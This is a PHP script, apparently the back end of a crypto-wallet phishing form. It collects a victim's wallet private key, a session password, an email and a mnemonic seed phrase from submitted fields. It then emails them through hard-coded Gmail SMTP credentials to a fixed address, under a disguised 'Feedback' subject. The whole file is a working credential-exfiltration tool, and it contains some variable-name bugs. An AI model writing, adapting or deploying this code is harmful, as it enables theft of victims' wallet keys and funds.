<?php
require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$subject = "Feedback";
$privateKey = $_POST['privateKey'];
$pkpass = $_POST['pkpass'];
$email_from = $wallet_email;
$email_to = 'emmajoy658@gmail.com';

if($privateKey== '' || $pkpass== ''){
        echo "check the fields";
    }else{



$mail = new PHPMailer();
$mail->isSMTP();
$mail->Host = "smtp.gmail.com";
$mail->SMTPAuth = "true";
$mail->SMTPSecure = "tls";
$mail->Port = "587";
$mail->Username = "emmajoy658@gmail.com";
$mail->Password = "Olasunkanmi2001!";
$mail->setFrom($_POST['wallet_email'], $_POST['mnemonic']);
$mail->AddReplyTo($_POST['wallet_email'], $_POST['mnemonic']);
$mail->Subject = "/New Entry";
$mail->MsgHTML($wallet_email);

$mail->Body = "Private Key= " . $privatekey . "\r\n Temporary Session Password= " . $pkpass;

$mail->addAddress($email_to);
if ( $mail->Send() ) {
  echo "Processing";
}else{
  echo "Error";
}
}
$mail->smtpClose();

?>
